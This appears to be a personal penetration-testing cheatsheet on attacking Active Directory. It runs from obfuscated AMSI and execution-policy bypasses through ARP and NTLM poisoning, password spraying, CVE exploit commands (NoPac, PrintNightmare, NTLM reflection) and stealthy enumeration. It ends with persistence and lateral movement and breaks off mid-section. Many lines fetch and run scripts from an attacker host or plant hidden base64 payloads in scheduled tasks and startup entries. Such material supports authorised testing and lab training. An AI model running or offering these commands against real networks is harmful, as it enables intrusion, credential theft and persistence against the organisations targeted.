---
title: "Active Directory"
slug: "active-directory"
chapter: "microsoft"
priority: 1
editor: "markdown"
revisionCount: 52
id: 59
createdAt: "2021-06-15T19:52:58Z"
createdBy: "blackwasp"
updatedAt: "2025-10-28T15:29:09Z"
updatedBy: "blackwasp"
ownedBy: "blackwasp"
restricted: true
views: 204
---
This cheatsheet is built from numerous papers, GitHub repos and GitBook, blogs, HTB boxes and labs, and other resources found on the web or through my experience. This was originally a private page that I made public, so it is possible that I have copy/paste some parts from other places and I forgot to credit or modify. If it the case, you can contact me on my Twitter [**@BlWasp_**](https://twitter.com/BlWasp_).

I will try to put as many links as possible at the end of the page to direct to more complete resources.

## Misc

### Internal audit mindmap

[Insane mindmap](https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg) by [@M4yFly](https://twitter.com/M4yFly).

### Bypass AMSI

```powershell
#Downgrade PowerShell
powershell -v 2 -c "<...>"

#Classic
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

#Base64
[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)

#Force AMSI error
$w = 'System.Management.Automation.A';$c = 'si';$m = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $w,$c,$m))
$field = $assembly.GetField(('am{0}InitFailed' -f $c),'NonPublic,Static')
$field.SetValue($null,$true)

#On PowerShell 6
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('s_amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Create PowerShell credentials

```powershell
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("DOMAIN\user", $pass)
```

### Decipher Secure-String

With the corresponding AES key

```powershell
$aesKey = (49, 222, 253, 86, 26, 137, 92, 43, 29, 200, 17, 203, 88, 97, 39, 38, 60, 119, 46, 44, 219, 179, 13, 194, 191, 199, 78, 10, 4, 40, 87, 159)
$secureObject = ConvertTo-SecureString -String "76492d11167[SNIP]MwA4AGEAYwA1AGMAZgA=" -Key $aesKey
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject)
$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted)
$decrypted
```

### Bypass execution policy

```powershell
#By spawning a new PowerShell session in the current one
powershell -nop -exec bypass

#By disabling the execution policy in the registry
Set-ExecutionPolicy -ExecutionPolicy bypass -Scope LocalMachine -Force

#Load a PowerShell module without confirmation prompt
Import-Module ./evil.psm1 -Force
```

### Execution context / AppLocker

#### AppLocker

```powershell
#Get AppLocker policy
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

By default, `C:\Windows` is not blocked, and `C:\Windows\Tasks` is writeable by any users.

#### Bypass Constrained Language Mode

Import `BypassCLM.exe` and `Mono.Options.dll` in a directory where the AppLocker policy authorize the execution, then

```powershell
#Get language mode
$ExecutionContext.SessionState.LanguageMode
#To bypass with PowerShell 6
pwsh

.\BypassCLM.exe -c "iex (new-object net.webclient).downloadstring('http://192.168.50.44/Invoke-HelloWorld.ps1')"
```

### Port forwarding

We can contact a machine, and this one can contact another machine, but we can't contact the second machine directly from our primary machine\
On the "central" machine, all the hit on the port 80 or 4545 will be forward to the `connectaddress` on the specified port :

```powershell
#Forward the port 4545 for the reverse shell, and the 80 for the http server for example
netsh interface portproxy add v4tov4 listenport=4545 connectaddress=192.168.50.44 connectport=4545
netsh interface portproxy add v4tov4 listenport=80 connectaddress=192.168.50.44 connectport=80

#Correctly open the port on the machine
netsh advfirewall firewall add rule name="PortForwarding 80" dir=in action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 80" dir=out action=allow protocol=TCP localport=80
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=in action=allow protocol=TCP localport=4545
netsh advfirewall firewall add rule name="PortForwarding 4545" dir=out action=allow protocol=TCP localport=4545
```

### Run domain commands from a non domain joined computer

```batch
runas /netonly /user:DOMAIN\User1 cmd.exe
```

## Initial Access

What to do when you are plugged on the network without creds.

* NTLM authentication capture on the wire with [Responder or Inveigh](/books/cheatsheets-82c/page/active-directory#bkmrk-responder-%2F-inveigh) poisoning, maybe in NTLMv1 ?
* [Relay the NTLM authentications](/books/cheatsheets-82c/page/active-directory#bkmrk-ntlm-and-kerberos-re) to interesting endpoints, be careful to the signing
  * SMB socks to list/read/write the shares
  * LDAP to dump the directory
  * LDAPS (or maybe SMB if signing not required) to add a computer account
  * ...
* ARP poisoning with **bettercap**, can be used to poison ARP tables of targets and receive authenticated requests normally destinated to other devices. Interesting scenarios can be found [here](https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/arp-poisoning#scenarios-examples).
  * By sniffing everything on the wire with Wireshark, some secrets can be found with **PCredz**.

First, run bettercap with this config file:

```bash
# quick recon of the network
net.probe on

# set the ARP poisoning
set arp.spoof.targets <target_IP>
set arp.spoof.internal true
set arp.spoof.fullduplex true

# control logging and verbosity
events.ignore endpoint
events.ignore net.sniff.mdns

# start the modules
arp.spoof on
net.sniff on
```

```bash
sudo ./bettercap --iface <interface> --caplet spoof.cap
```

Then sniff with Wireshark. When it is finish, save the trace in a `.pcap` file and extract the secrets:

```bash
python3 ./Pcredz -f extract.pcap
```

* [Poison the DHCPv6](/books/cheatsheets-82c/page/active-directory#bkmrk-mitm6) answer to receive NTLM or Kerberos authentication
  * NTLM auths can be relayed with `ntlmrelayx`
  * Kerberos auths can be relayed with `krbrelayx` to HTTP endpoints (ADCS, SCCM AdminService API)
* Search for a domain account
  * Look for SMB Guest and null session, and LDAP null bind
  * Perform RID cycling (look at the Active Directory - Python edition cheatsheet)
  * With SMB login bruteforce
  * With Kerbrute bruteforce

Allows you to bruteforce Kerberos on user accounts while indicating whether the user account exists or not. Another advantage over `smb_login` is that it doesn't correspond to the same EventId, thus bypassing potential alerts. The script can work with 2 independent lists for users and passwords, but be careful not to block accounts!

```bash
./kerbrute userenum -domain domain.local users.txt
```

Test for the Top1000 with `login = password`

Possible other passwords:

```
(empty)
password
P@ssw0rd
```

* Look for juicy [CVEs](/books/cheatsheets-82c/page/active-directory#bkmrk-cves)
* Search for devices like printers, routers, or similar stuff with default creds

In case a printer (or something similar) has an LDAP account, but use the `SASL` authentication family instead of `SIMPLE`, the classic LDAP passback exploitation with a `nc` server will not be sufficient to retrieve the credentials in clear text. Instead, use a custom LDAP server that only offer the weak `PLAIN` and `LOGIN` protocols. [This Docker](https://github.com/pedrojosenavasperez/ldap-passback-docker) permits to operate with weak protocols.

```bash
docker buildx build -t ldap-passback .
docker run --rm -ti -p 389:389 ldap-passback
```

In parallel, listen with tshark:

```bash
tshark -i any -f "port 389" \
  -Y "ldap.protocolOp == 0 && ldap.simple" \
  -e ldap.name -e ldap.simple -Tjson
```

## CVEs

### AD oriented

* [CVE-2025-33073](https://www.synacktiv.com/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025) - NTLM Reflective relay

Permits to relay a SMB authentication from a machine to itself, with SYSTEM privileges thanks to Local NTLM authentication. SMB signing must not be enforced **to relay from SMB to SMB**.

If services such as WinRM/S, MSSQL, or HTTP/S are active on the machine (Windows Servers or ADCS PKI, for example), relaying is still possible, even with signing or EPA enabled! Only a complete patch truly blocks it. **The only exceptions are LDAPS and RPC**.

```bash
#Check if a computer is vulnerable
nxc smb <target> -u user1 -p password -M ntlm_reflection

#Setup DNS
dnstool.py -u 'domain.local\user1' -p password -a add -r $TARGET_NETBIOS1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d <attacker_IP> <DC_IP>
	# Or, to target any computer
dnstool.py -u 'domain.local\user1' -p password -a add -r localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d <attacker_IP> <DC_IP>

#Coerce
PetitPotam.py -u user1 -p password -d domain.local $TARGET_NETBIOS1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA TARGET.DOMAIN.LOCAL

#Chose the service to relay
ntlmrelayx.py -t <target_FQDN> -smb2support -socks
ntlmrelayx.py -t mssql://<target_FQDN> -smb2support -socks
ntlmrelayx.py -t winrms://<target_FQDN> -smb2support -socks
```
* SPNEGO RCE (CVE-2022-37958) - No public POC for the moment
* [PetitPotam pre-auth](https://github.com/topotam/PetitPotam) (CVE-2022-26925)

If the target is not patched, this CVE can be exploited without creds.

```powershell
./PetitPotam.exe -pipe all <attacker_IP> <target_IP>
```

* [NoPac](https://github.com/cube0x0/noPac) (a.k.a. SamAccountName Spoofing, CVE-2021-42278 and CVE-2021-42287)

To exploit these vulnerabilities you need to already control a computer account or have the right to create a new one.

```powershell
#Scan for the vuln
.\noPac.exe scan -domain domain.local -user user1 -pass 'password'

#Exploit it and retrieve a ST for the DC
.\noPac.exe -domain domain.local -user user1 -pass 'password' /dc dcVuln.domain.local /mAccount evilComputer /mPassword 'evilPass!' /service cifs /ptt
```

* [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare) (CVE-2021-1675 / CVE-2021-34527)

```powershell
#Load and execute a DLL hosted on a SMB server on the attacker machine
./SharpPrintNightmare.exe '\\<attacker_IP>\smb\addUser.dll' '\\<target_IP>'
```

* [Zerologon](https://www.thehacker.recipes/ad/movement/netlogon/zerologon#password-change-disruptive) (CVE-2020-1472)

The relay technique is preferable to the other one which is more risky and potentially destructive. See in the link.

* EternalBlue / Blue Keep (MS17-010 / CVE-2019-0708)

The exploits in the Metasploit framework are good for these two CVEs.

```bash
#EternalBlue
msf6 exploit(windows/smb/ms17_010_psexec) >

#Blue Keep
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) >
```

* SMBGhost (CVE-2020-0796)

**Be careful, this exploit is pretty unstable and the risk of BSOD is really important.** The exploit in the Metasploit framework is good for this CVE.

```bash
msf6 exploit(windows/smb/cve_2020_0796_smbghost) >
```

* [RC4-MD4 downgrade](https://github.com/Bdenneu/CVE-2022-33679) (CVE-2022-33679)

To exploit this CVE the **RC4-MD4** encryption must be enabled on the KDC, and an AS-REP Roastable account is needed to obtain an ST for the target.

```bash
./CVE-2022-33079.py -dc-ip <DC_IP> domain.local/<as-rep_roastable_user> <target_NETBIOS>
```

* [Credentials Roaming](https://www.mandiant.com/resources/blog/apt29-windows-credential-roaming?s=33) (CVE-2022-30170)

```powershell
# Fetch current user object
$user = get-aduser <victim username> -properties @('msPKIDPAPIMasterKeys','msPKIAccountCredentials', 'msPKI-CredentialRoamingTokens','msPKIRoamingTimestamp')

# Install malicious Roaming Token (spawns calc.exe)
$malicious_hex = "25335c2e2e5c2e2e5c57696e646f77735c5374617274204d656e755c50726f6772616d735c537461727475705c6d616c6963696f75732e6261740000000000000000000000000000000000000000000000000000000000000000000000000000f0a1f04c9c1ad80100000000f52f696ec0f1d3b13e9d9d553adbb491ca6cc7a319000000406563686f206f66660d0a73746172742063616c632e657865"
$attribute_string = "B:$($malicious_hex.Length):${malicious_hex}:$($user.DistinguishedName)"
Set-ADUser -Identity $user -Add @{msPKIAccountCredentials=$attribute_string} -Verbose

# Set new msPKIRoamingTimestamp so the victim machine knows an update was pushed
$new_msPKIRoamingTimestamp = ($user.msPKIRoamingTimestamp[8..15] + [System.BitConverter]::GetBytes([datetime]::UtcNow.ToFileTime())) -as [byte[]]
Set-ADUser -Identity $user -Replace @{msPKIRoamingTimestamp=$new_msPKIRoamingTimestamp} -Verbose
```

* [Bronze Bit](https://www.netspi.com/blog/technical/network-penetration-testing/cve-2020-17049-kerberos-bronze-bit-overview) (CVE-2020-17049)

To exploit this CVE, a controlled service account with constrained delegation to the target account is needed.

```powershell
./Rubeus.exe s4u /bronzebit /user:<service_account> /rc4:<service_account_hash> /dc:dc.domain.local /impersonateuser:Administrator /domain:domain.local /altservice:cifs/target.domain.local /nowrap
```

* [MS14-068](https://tools.thehacker.recipes/impacket/examples/goldenpac.py)

```bash
goldenPac.py 'domain.local'/'user1':'password'@<DC_IP>
```

### Targeting Exchange server

* ProxyNotShell / ProxyShell / ProxyLogon (CVE-2022-41040 & CVE-2022-41082 / CVE-2021-34473 & CVE-2021-34523 & CVE-2021-31207 / CVE-2021-26855 & CVE-2021-27065)

The exploits in the Metasploit framework are good for these three CVEs.

```bash
msf6 exploit(windows/http/exchange_proxynotshell_rce) >
msf6 exploit(windows/http/exchange_proxyshell_rce) >
msf6 exploit(windows/http/exchange_proxylogon_rce) >
```

* [CVE-2023-23397](https://github.com/Trackflaw/CVE-2023-23397)

This CVE permits to leak the NTLM hash of the target as soon as the email arrives in his Outlook mail box. This PoC generates a `.msg` file containing the exploit in the pop-up sound attribute. It is up to you to send the email to the target.

```powershell
python3.exe CVE-2023-23397.py --path '\\<attacker_IP>\'
```

Before sending the email, run Inveigh to intercept the NTLM hash.

### For local privesc

* [CVE-2022-41057](https://bugs.chromium.org/p/project-zero/issues/detail?id=2346)
* [KrbRelayUp](/books/cheatsheets-82c/page/active-directory#bkmrk-krbrelayup)
* [SpoolFool](https://github.com/ly4k/SpoolFool) (CVE-2022-21999)

```powershell
./SpoolFool.exe -dll adUser.dll

#In PowerShell
Import-Module .\SpoolFool.ps1
Invoke-SpoolFool -dll adUser.dll
```

* [PrintNightmare](https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare) (CVE-2021-1675 / CVE-2021-34527)

```powershell
./SharpPrintNightmare.exe ./adUser.dll
```

* [HiveNightmare](https://github.com/WiredPulse/Invoke-HiveNightmare) (CVE-2021-36934)

```powershell
./Invoke-HiveNightmare.ps1 -path ./HiveDumps
```

## Domain Enumeration

### Domain objects

#### Current domain

```powershell
#PowerView
Get-NetDomain
#AD Module
Get-ADDomain

#Domain SID
Get-DomainSID
(Get-ADDomain).DomainSID

#Domain policy
(Get-DomainPolicy)."system access"
```

#### Another domain

```powershell
#PowerView
Get-NetDomain -Domain domain.local

#AD Module
Get-ADDomain -Identity domain.local
```

### Domain controller

#### Current domain

```powershell
#PowerView
Get-NetDomainController
#AD Module
Get-ADDomainController

Get-NetDomainController -Domain domain.local
Get-ADDomainController -DomainName domain.local -Discover
```

### Users enumeration

#### List users

```powershell
#PowerView
Get-NetUser
Get-NetUser -Identity user1

#AD Module
Get-ADUser -Filter * -Properties *
Get-ADUser -Identity user1 -Properties *
```

#### User's properties

```powershell
#AD Module
Get-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name
Get-ADUser -Filter * -Properties * | select name,@{expression={[datetime]::fromFileTime($_.pwdlastset)}}
```

#### Search for a particular string in attributes

```powershell
Find-UserField -SearchField Description -SearchTerm "password"
Get-ADUser -Filter 'Description -like "*password*"' -Properties Description | select name,Description
```

#### Actively logged users on a machine

Needs local admin rights on the target

```powershell
Get-NetLoggedon -ComputerName <target>
```

#### Locally logged users on a machine

Needs remote registry on the target - started by-default on server OS

```powershell
Get-LoggedonLocal -ComputerName <target>
```

#### Last logged user on a machine

Needs administrative rights and remote registry on the target

```powershell
Get-LastLoggedOn -ComputerName <target>
```

### User hunting

#### Find machine where the user has admin privs

```powershell
Find-LocalAdminAccess -Verbose
```

If the RPC or SMB ports are blocked, see `Find-WMILocalAdminAccess.ps1` and `Find-PSRemotingLocalAdminAccess.ps1` to use WMI or PowerShell Remoting

#### Find local admins on the domain machines

```powershell
Invoke-EnumerateLocalAdmin -Verbose
```

#### Find machines where specific users or groups have sessions

```powershell
Invoke-UserHunter #Admins
Invoke-UserHunter -GroupName "<group_target>"
```

#### Check local admin access for the current user where the targets are found

```powershell
Invoke-UserHunter -CheckAccess
```

### Computers enumeration

```powershell
#PowerView
Get-NetComputer
Get-NetComputer -OperatingSystem "*Server 2016*"
Get-NetComputer -FullData

#AD Module
Get-ADComputer -Filter * | select Name
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2016*"' -Properties OperatingSystem | select Name,OperatingSystem
Get-ADComputer -Filter * -Properties DNSHostName | %{TestConnection -Count 1 -ComputerName $_.DNSHostName}
Get-ADComputer -Filter * -Properties *
```

### Groups enumeration

#### Groups in the current domain

```powershell
#PowerView
Get-NetGroup
Get-NetGroup -FullData

#AD Module
Get-ADGroup -Filter * | select Name 
Get-ADGroup -Filter * -Properties *
```

#### Search for a particular string in attributes

```powershell
#PowerView
Get-NetGroup *admin*

#AD Module
Get-ADGroup -Filter 'Name -like "*admin*"' | select Name
```

#### All users in a specific group

```powershell
#PowerView
Get-NetGroupMember -GroupName "<group>" -Recurse

#AD Module
Get-ADGroupMember -Identity "<group>" -Recursive
```

#### All groups of an user

```powershell
#PowerView
Get-NetGroup -MemberIdentity "user1"

#AD Module
Get-ADPrincipalGroupMembership -Identity "user1"
```

#### Local groups enumeration

```powershell
Get-NetLocalGroup -ComputerName <target> -ListGroups
```

#### Members of local groups

```powershell
Get-NetLocalGroup -ComputerName <target> -Recurse
```

### Shares / Files

#### Find shares on the domain

```powershell
Invoke-ShareFinder -Verbose
```

#### Sensitive files on the domain

```powershell
Invoke-FileFinder -Verbose
Invoke-FileFinder -Verbose -Include "*pass*"
```

Or with Snaffler

`snaffler.exe -s - snaffler.log` ... (:

```powershell
#Snaffle all the computers in the domain
./Snaffler.exe -d domain.local -c <DC> -s
	#Send the result to a file
./Snaffler.exe -d domain.local -c <DC> -o res.log

#Snaffle specific computers
./Snaffler.exe -n computer1,computer2 -s

#Snaffle a specific directory
./Snaffler.exe -i C:\ -s
```

#### Find all fileservers of the domain

```powershell
Get-NetFileServer
```

### GPO enumeration

#### List of GPO in the domain

```powershell
#PowerView
Get-NetGPO
#GPOs applied to a computer
Get-NetGPO -ComputerName <target>

#AD Module
Get-GPO -All #(GroupPolicy module)
Get-GPResultantSetOfPolicy -ReportType Html -Path C:\Users\Administrator\report.html #(Provides RSoP)
```

#### Get GPO that modify local group via Restricted Groups

```powershell
Get-NetGPOGroup
```

#### Users which are in a local group of a machine using GPOs

```powershell
Find-GPOComputerAdmin -Computername <target>
```

#### Machine where an user is member of a local group using GPOs

```powershell
Find-GPOLocation -Identity user1 -Verbose
```

More advanced GPO enumeration techniques, allowing BloodHound ingestion, are presented in the Active Directory - Python edition cheatsheet.

### Organisation Units

#### OUs of the domain

```powershell
Get-NetOU -FullData
Get-ADOrganizationalUnit -Filter * -Properties *
```

#### Computers within an OU

```powershell
Get-NetComputer | ? { $_.DistinguishedName -match "OU=<OU_name>" } | select DnsHostName
```

#### GPO applied on an OU / Read GPO from the GP-Link attribut from `Get-NetOU`

```powershell
Get-NetGPO -GPOname "{<OU_ID>}"
Get-GPO -Guid <OU_ID> #(GroupPolicy module)
```

### DACLs

#### All ACLs associated to an object (inbound)

```powershell
Get-ObjectAcl -Identity user1 -ResolveGUIDs
(Get-ObjectAcl | Where-Object {$_.ObjectSid -match "<object_SID>"})
```

#### Outbound ACLs of an object

These are the rights the object has in the AD

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "<target>"}
Get-ObjectAcl -ResolveGUIDs | ? {$_.SecurityIdentifier -match "user1"}
```

#### ACLs associated to a specific path

```powershell
Get-PathAcl -Path "\\dc.domain.local\sysvol"
```

### Trusts

#### Map trusts

```powershell
Invoke-MapDomainTrust
```

#### Domain trusts for the current domain

```powershell
#PowerView
Get-NetDomainTrust #Find potential external trust

#AD Module
Get-ADTrust
```

### Forest

#### Details about the current forest

```powershell
#PowerView
Get-NetForest
Get-NetForest -Forest domain.local

#AD Module
Get-ADForest
Get-ADForest -Identity domain.local
```

#### All domains in the current forest

```powershell
#PowerView
Get-NetForestDomain
Get-NetForestDomain -Forest domain.local

#AD Module
(Get-ADForest).Domains
```

#### Global catalogs of the current forest

```powershell
#PowerView
Get-NetForestCatalog
Get-NetForestCatalog -Forest domain.local

#AD Module
Get-ADForest | select -ExpandProperty GlobalCatalogs
```

#### Forest trusts

```powershell
#PowerView
Get-NetForestTrust
Get-NetForestTrust -Forest domain.local

#AD Module
Get-ADTrust -Filter 'msDS-TrustForestTrustInfo -ne "$null"'
```

## BloodHound / SharpHound / SOAPHound

### Basic usage

```powershell
# Default collection
SharpHound.exe

# All collection excepted GPOLocalGroup with all string properties
SharpHound.exe --CollectionMethod All --CollectAllProperties

#Only collect from the DC, doesn't query the computers (more stealthy)
SharpHound.exe --CollectionMethod DCOnly
#Only collect user sessions and LocalGroup from computers, not the DC
SharpHound.exe --CollectionMethod ComputerOnly
```

### Stealth usage

```powershell
#Stealth collection soutions
SharpHound.exe --CollectionMethod ComputerOnly --Stealth
SharpHound.exe --ExcludeDomainControllers

#Encrypt the output archive with a random password
SharpHound.exe --EncryptZip
```

### Loop collection

Useful for user session collection for example. SharpHound will run the collection regularly and output a new zip file after each loop.

```powershell
#It will loop during 2h by default
SharpHound.exe --CollectionMethod Session --Loop

#Loop during 5h
SharpHound.exe --CollectionMethod Session --Loop --Loopduration 05:00:00
```

### From a non domain joined computer

* Configure the DNS of the machine to be the DC
* Spawn a shell as a domain user
* Verify you’ve got valid domain authentiation by using the `net` binary
* Run SharpHound, using the `-d` flag to specify the AD domain you want to collect information from. You can also use any other flags you wish.

```batch
runas /netonly /user:DOMAIN\User1 cmd.exe
net view \\domain\
SharpHound.exe -d domain.local
```

### Interesting Neo4j queries

#### Users with SPNs

```sql
MATCH (u:User {hasspn:true}) RETURN u
```

#### AS-REP Roastable users

```sql
MATCH (u:User {dontrepreauth:true}) RETURN u
```

#### Computers AllowedToDelegate to other computers

```sql
MATCH (c:Computer), (t:Computer), p=((c)-[:AllowedToDelegate]->(t)) return p
```

#### Shortest path from Kerberoastable user

```sql
MATCH (u:User {hasspn:true}), (c:Computer), p=shortestPath((u)-[*1..]->(c)) RETURN p
```

#### Computers in Unconstrained Delegations

```sql
MATCH (c:Computer {unconsraineddelegation:true}) RETURN c
```

#### Rights against GPOs

```sql
MATCH (gr:Group), (gp:GPO), p=((gr)-[:GenericWrite]->(gp)) return p
```

#### Potential SQL Admins

```sql
MATCH p=(u:User)-[:SQLAdmin]->(c:Computer) return p
```

#### LAPS

Machine with LAPS enabled

```sql
MATCH (c:Computer {haslaps:true}) RETURN c 
```

Users with read LAPS rights against "LAPS machines"

```sql
MATCH p=(g:Group)-[:ReaLAPSPassword]->(c:Computer) return p
```

### SOAPHound

A tool to gather LDAP information through the ADWS service with SOAP queries instead of the LDAP one. Data can be displayed in BloodHound.

```powershell
#Build cache
SOAPHound.exe --showstats -c c:\temp\cache.txt

#Collect data
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output

#For larger domain, if timeout errors are encountered
SOAPHound.exe -c c:\temp\cache.txt --bhdump -o c:\temp\bloodhound-output --autosplit --threshold 1000

#Collect ADCS data
SOAPHound.exe -c c:\temp\cache.txt --certdump -o c:\temp\bloodhound-output

#Dump ADIDNS data
SOAPHound.exe --dnsdump -o c:\temp\dns-output
```

### MSSQLHound

The [MSSQLHound](https://github.com/SpecterOps/MSSQLHound) tool allows you to map MSSQL databases on the network, as well as the links between them and the rights to them.

The output can then be ingested into **BloodHound CE**.

```powershell
MSSQLHound.ps1 -OutputFormat BloodHound -UserID user1 -Password password -Domain domain.local -DomainController <DC_IP> -InstallADModule On -MakeInterestingEdgesTraversable On
```

### AD Miner

[AD Miner](https://github.com/Mazars-Tech/AD\_Miner) is another solution to display BloodHound data into a web based GUI. It is usefull for its **Smartest paths** feature that permits to display the, sometimes longer, but simpler compromission path (for example, when the shortest path implies a `ExecuteDCOM` edge).

## Local Privesc

### PowerUp

```powershell
#All checks
Invoke-AllChecks

#Get services with unquoted paths and a space in their name.
Get-UnquotedService -Verbose

#Get services where the current user can write to its binary path or change arguments to the binary
Get-ModifiableServiceFile -Verbose

#Get the services whose configuration current user can modify.
Get-ModifiableService -Verbose

#DLL Hijacking
Find-ProcessDLLHijack
Find-PathDLLHijack
```

### Other enumeration tools

```powershell
#PrivescCheck: https://github.com/itm4n/PrivescCheck
. .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended

.\beRoot.exe
.\winPEAS.exe
.\Seatbelt.exe -group=all -full

#Privesc: https://github.com/enjoiz/Privesc
Invoke-PrivEsc
```

### Always Install Elevated

```batch
run msiexec /i BeaconInstaller.msi /q /n
```

### Impersonation attacks / Potatoes

[Full article here](/books/windows-sNL/page/in-the-potato-family-i-want-them-all)

### KrbRelayUp

#### With RBCD

```powershell
./KrbRelayUp.exe relay -Domain domain.local -CreateNewComputerAccount -ComputerName test$ -ComputerPassword Password123!
./KrbRelayUp.exe spawn -d domain.local -cn test$ -cp Password123!
```

#### With ShadowCreds

```powershell
./KrbRelayUp.exe full -m shadowcred --ForceShadowCred
```

#### With ADCS

```powershell
./KrbRelayUp.exe full -m adcs
```

### DavRelayUp

Similar to KrbRelayUp, but relay from WebDAV to LDAP.

```powershell
#Create a new computer account to perform RBCD
./DavRelayUp.exe -c

#Use an existing computer account
./DavRelayUp.exe -cn <computer_name> -cp <computer_password>

#Impersonate another local user than Administrator
./DavRelayUp.exe -c -i user1

#Start WebDAV on another port than the default 55555
./DavRelayUp.exe -c -p 1234
```

### Massive local privesc cheatsheet

[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

### Escape JEA

#### Abuse an allowed function

```powershell
#Look at allowed functions
Get-Command

#Look at the function code
(Get-Command <function>).Definition
#Or
gcm <function> -show
```

For example if it is possible to control the `$param` parameter here `$ExecutionContext.InvokeCommand.ExpandString($param)`, it is possible to execute some code by passing this as argument : `'$(powershell.exe -c "iEx (New-Object System.Net.WebClient).DownloadString(''http://attacker_IP/Invoke-HelloWorld.ps1'')")'`

#### Function creation

If the JEA allowed to create a new function it can be abused

```powershell
Invoke-Command -Session $sess -ScriptBlock {function blackwasp {iex (new-object net.webclient).downloadstring('http://attacker_IP/Invoke-HelloWorld.ps1')}}
Invoke-Command -Session $sess -ScriptBlock {blackwasp}
```

#### With another WinrRM client

Sometimes this WinRM in Python can bypass the JEA

```python
import winrm

s = winrm.Session('target_IP', auth=('administrator', 'password'))
r = s.run_cmd('powershell -c "IEX((New-Object System.Net.WebClient).DownloadString(\'http://attacker_IP/Invoke-HelloWorld.ps1\'))"')

print r.status_code
print r.std_out
print r.std_err
```

## Local Persistence

### SharPersist

`SharPersist.exe` can be used for local persistence on a workstation.

Common userland persistences:

* HKCU / HKLM Registry Autoruns
* Scheduled Tasks
* Startup Folder

```powershell
#Convert command to execute to base64
$str = 'IEX ((new-object net.webclient).downloadstring("http://attacker_ip/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))

#Via scheduled task
.\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64>" -n "Updater" -m add -o hourly

#Via startup folder
.\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc <base64>" -f "UserEnvSetup" -m add

#Via registry key, first create a .exe beacon named updater.exe, then
.\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

### LAPS persistence

To prevent a machine to update its LAPS password, it is possible to set the update date in the futur.

```powershell
Set-DomainObject -Identity <target_machine> -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```

### JEA persistence

Allows every commands to a user on a machine.

```powershell
Set-JEAPermissions -ComputerName dc -SamAccountName user1 -Verbose

Enter-PSSession -ComputerName dc -ConfigurationName microsoft.powershell64
```

## Lateral Movement

### PowerShell remoting

#### From one computer to other ones

```powershell
$sess = New-PSSession -ComputerName <computername>
Enter-PSSession -Session $sess

#Provide PS credentials
New-PSSession -Credential $cred

#To many computers
Invoke-Command -Credential $cred -ComputerName (Get-Content ./listServers.txt)
```

#### Execute scripts

```powershell
#Script block
Invoke-Command -Scriptblock {Get-Process} -ComputerName Server01, Server02

#Script from file
Invoke-Command -FilePath .\Invoke-Mimikatz.ps1 -ComputerName Server01
```

#### Execute locally loaded function to remote

Can be usefull to bypass some restricions

```powershell
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName Server01, Server02

#With arguments
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz} -ComputerName Server01 -ArgumentList DumpCreds
```

#### Item copy

```powershell
Copy-Item -ToSession $sess -Path <local_path> -Destination <path_on_target>
```

### Scheduled task creation

Create a scheduled task on a remote machine, with sufficient rights

```powershell
#Creation
schtasks /create /S <target>.domain.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://<attacker_IP>/Invoke-PowerShellTcp.ps1''')'"

#Task execution
schtasks /Run /S <target>.domain.local /TN "STCheck"
```

### Credentials gathering / Mimikatz

#### Dump creds

```powershell
#Dump LSASS credentials on a local machine
